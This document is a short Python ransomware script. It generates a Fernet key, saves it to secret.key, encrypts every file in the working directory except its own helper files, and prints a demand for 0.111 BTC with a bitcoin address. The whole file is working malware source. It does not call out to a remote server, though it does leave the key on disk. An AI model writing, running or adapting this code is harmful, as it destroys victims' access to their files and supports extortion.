#!/usr/bin/env python3
amount="0.111"
address="bitcoin:bc1qara405e5w9luqa0zvz9dx29l2j78mwhrpvj54t"
import os
from cryptography.fernet import Fernet

files=[]
for file in os.listdir():
	if file=="payload.py" or file=="recovery.py" or file=="secret.key":
		continue
	if os.path.isfile(file):
        	files.append(file)

key= Fernet.generate_key()
with open("secret.key","wb") as seckey:
	seckey.write(key)

for file in files:
	with open(file,"rb") as rfile:
		content=rfile.read()
	enccontent=Fernet(key).encrypt(content)
	with open(file,"wb") as wfile:
		wfile.write(enccontent)
print("Files are Encrypted pay "+amount+"BTC to retrieve your content back!!!")
print(address)
